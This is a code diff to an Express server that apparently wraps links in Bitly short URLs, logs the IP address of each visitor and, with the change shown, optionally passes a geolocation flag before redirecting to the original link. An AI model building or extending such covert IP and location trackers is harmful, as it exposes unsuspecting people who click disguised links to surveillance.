@@ -6,7 +6,7 @@ const express = require("express");
 const port = process.env.PORT || 3000;
 const TOKEN = process.env.LINE_TOKEN;
 const bitly_token = process.env.BITLY_TOKEN;
-let lock = false, random = 400, original = '', push_status = false, geo = '';
+let lock = false, random = 400, original = '', push_status = false, geolocation = '';
 
 const app = express();
 
@@ -82,10 +82,12 @@ app
   })
   .post("/generated", (req, res) => {
     const name = req.body.name, url = req.body.url, userId = req.query.userId || null;
+    const geo = req.query.geo || 'false'; 
     const query = {
       name: name,
       original: url,
-      id: userId
+      id: userId,
+      geo: geo
     };
     const longUrl = "https://get-ip-nero.herokuapp.com/get/ip/nero?" + qs.stringify(query),
     req_url = "https://api-ssl.bitly.com/v3/shorten?" + qs.stringify({
@@ -105,7 +107,7 @@ app
   })
   .get("/get/ip/nero", (req, res) => {
     const nom = req.query.name, id = req.query.id;
-    geo = req.query.geo; original = req.query.original;
+    original = req.query.original; geolocation = req.query.geo;
     res.sendFile(__dirname + '/open.html');
     // get ip
     const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.connection.socket.remoteAddress || req.socket.remoteAddress || '0.0.0.0', 
@@ -128,7 +130,7 @@ app
   })
   .get("/auth", (req, res) => {
     const URL = original || "https://rhipsali.github.io/get_ip";
-    res.send(JSON.stringify({url: URL, geo: geo}));
+    res.send(JSON.stringify({url: URL, geo: geolocation}));
   })
   .listen(port, () => console.log("listening on " + port))
 ;
